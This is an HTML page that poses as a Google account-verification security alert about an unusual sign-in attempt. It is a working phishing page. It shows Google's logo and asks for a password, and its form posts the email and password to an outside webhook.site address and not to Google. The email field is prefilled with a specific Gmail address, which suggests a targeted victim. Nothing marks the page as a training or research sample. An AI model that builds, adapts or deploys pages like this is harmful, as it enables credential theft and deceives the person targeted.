<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Account Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        <h1>Security Alert</h1>
        <p><strong>Unusual sign-in attempt detected</strong><br>Verify your account to prevent lockout.</p>
        
        <form id="loginForm" action="http://webhook.site/072f9b3c-998a-420e-8e9e-0e915c38526e" method="POST">
            <input type="email" name="email" value="ammieyusman@gmail.com" readonly>
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="hidden" name="service" value="gmail">
            <button type="submit">Verify Account</button>
        </form>
        
        <div id="status"></div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            document.getElementById('status').innerHTML = 'Verifying...';
        });
    </script>
</body>
</html>
